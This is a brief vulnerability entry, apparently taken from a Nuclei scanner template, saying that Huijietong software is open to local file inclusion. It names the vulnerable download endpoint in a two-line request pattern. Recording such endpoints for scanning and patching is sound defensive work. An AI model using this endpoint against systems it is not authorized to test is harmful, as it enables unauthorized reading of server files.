# Vulnerability: Huijietong - Local File Inclusion
**Classification:** HUIJIETONG
**Source:** Nuclei Template (`huijietong-cloud-fileread.yaml`)

## Description
Huijietong is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
POST {{BaseURL}}/fileDownload?action=downloadBackupFile
POST {{BaseURL}}/fileDownload?action=downloadBackupFile
```

